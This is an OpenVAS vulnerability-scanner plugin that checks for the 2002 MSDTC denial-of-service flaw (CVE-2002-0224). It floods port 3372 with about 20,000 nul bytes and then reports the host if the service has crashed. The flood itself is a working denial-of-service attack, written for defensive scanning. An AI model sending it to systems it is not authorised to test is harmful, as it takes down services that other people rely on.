# OpenVAS Vulnerability Test
# $Id: msdtc_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MSDTC denial of service by flooding with nul bytes
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002  Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10939");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4006);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-0224");
  script_name("MSDTC denial of service by flooding with nul bytes");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002  Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/msdtc", 3372);

  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the MS02-018 bulletin
  for more information.");

  script_tag(name:"summary", value:"It was possible to crash the MSDTC service by sending
  20200 nul bytes.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

port = get_port_for_service(default:3372, proto:"msdtc");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0); # 20020 = 20*1001
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2)
  security_message(port:port);